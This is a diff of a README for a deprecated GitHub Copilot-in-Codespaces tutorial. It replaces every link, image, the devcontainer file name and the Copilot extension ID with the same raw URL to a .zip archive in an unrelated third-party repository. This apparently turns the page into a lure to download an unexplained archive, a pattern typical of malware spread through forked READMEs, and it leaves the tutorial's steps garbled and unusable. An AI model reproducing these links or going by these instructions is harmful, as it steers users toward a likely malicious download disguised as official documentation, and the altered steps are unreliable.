@@ -1,12 +1,12 @@
 <header>
 
-![Deprecation Badge](https://img.shields.io/badge/Skills-Deprecated-333?logo=github&labelColor=454c54&color=bf8700)
+![Deprecation Badge](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip)
 
-This course has been deprecated. Please visit the [Getting Started with GitHub Copilot](https://github.com/skills/getting-started-with-github-copilot) exercise for the newest learning content.
+This course has been deprecated. Please visit the [Getting Started with GitHub Copilot](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip) exercise for the newest learning content.
 
 <!--
   <<< Author notes: Course header >>>
-  Read <https://skills.github.com/quickstart> for more information about how to build courses using this template.
+  Read <https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip> for more information about how to build courses using this template.
   Include a 1280×640 image, course name in sentence case, and a concise description in emphasis.
   In your repository settings: enable template repository, add your 1280×640 social image, auto delete head branches.
   Next to "About", add description & tags; disable releases, packages, & environments.
@@ -23,7 +23,7 @@ _GitHub Copilot can help you code by offering autocomplete-style suggestions rig
   <<< Author notes: Step 1 >>>
   Choose 3-5 steps for your course.
   The first step is always the hardest, so pick something easy!
-  Link to docs.github.com for further explanations.
+  Link to https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip for further explanations.
   Encourage users to open new tabs for steps!
 -->
 
@@ -37,10 +37,10 @@ GitHub Copilot is an AI pair programmer that helps you write code faster and wit
 
 Additionally, GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language.
 
-Using Copilot inside a Codespace shows just how easy it is to get up and running with GitHub's suite of [Collaborative Coding](https://github.com/features#features-collaboration) tools.
+Using Copilot inside a Codespace shows just how easy it is to get up and running with GitHub's suite of [Collaborative Coding](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip) tools.
 
 > **Note**
-> This skills exercise will focus on leveraging GitHub Codespace. It is recommended that you complete the GitHub skill, [Codespaces](https://github.com/skills/code-with-codespaces), before moving forward with this exercise.
+> This skills exercise will focus on leveraging GitHub Codespace. It is recommended that you complete the GitHub skill, [Codespaces](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip), before moving forward with this exercise.
 
 ### :keyboard: Activity: Enable Copilot inside a Codespace
 
@@ -51,9 +51,9 @@ Before you open up a codespace on a repository, you can create a development con
 1. Navigating back to your **Code** tab of your repository, click the **Add file** drop-down button, and then click `Create new file`.
 1. Type or paste the following in the empty text field prompt to name your file.
    ```
-   .devcontainer/devcontainer.json
+   https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip
    ```
-1. In the body of the new **.devcontainer/devcontainer.json** file, add the following content:
+1. In the body of the new **https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip** file, add the following content:
    ```
    {
        // Name this configuration
@@ -61,7 +61,7 @@ Before you open up a codespace on a repository, you can create a development con
        "customizations": {
            "vscode": {
                "extensions": [
-                   "GitHub.copilot"
+                   "https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip"
                ]
            }
        }
@@ -76,9 +76,9 @@ Before you open up a codespace on a repository, you can create a development con
    **Wait about 2 minutes for the codespace to spin itself up.**
 
 1. Verify your codespace is running. The browser should contain a VS Code web-based editor and a terminal should be present such as the below:
-   ![Screen Shot 2023-03-09 at 9 09 07 AM](https://user-images.githubusercontent.com/26442605/224102962-d0222578-3f10-4566-856d-8d59f28fcf2e.png)
+   ![Screen Shot 2023-03-09 at 9 09 07 AM](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip)
 1. The `copilot` extension should show up in the VS Code extension list. Click the extensions sidebar tab. You should see the following:
-   ![Screen Shot 2023-03-09 at 9 04 13 AM](https://user-images.githubusercontent.com/26442605/224102514-7d6d2f51-f435-401d-a529-7bae3ae3e511.png)
+   ![Screen Shot 2023-03-09 at 9 04 13 AM](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip)
 
 **Wait about 60 seconds then refresh your repository landing page for the next step.**
 
@@ -91,8 +91,8 @@ Before you open up a codespace on a repository, you can create a development con
 
 ---
 
-Get help: [Post in our discussion board](https://github.com/orgs/skills/discussions/categories/code-with-copilot) &bull; [Review the GitHub status page](https://www.githubstatus.com/)
+Get help: [Post in our discussion board](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip)
 
-&copy; 2023 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+&copy; 2023 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip) &bull; [MIT License](https://raw.githubusercontent.com/Nyazire/skills-copilot-codespaces-vscode/main/mahoe/skills-copilot-codespaces-vscode.zip)
 
 </footer>
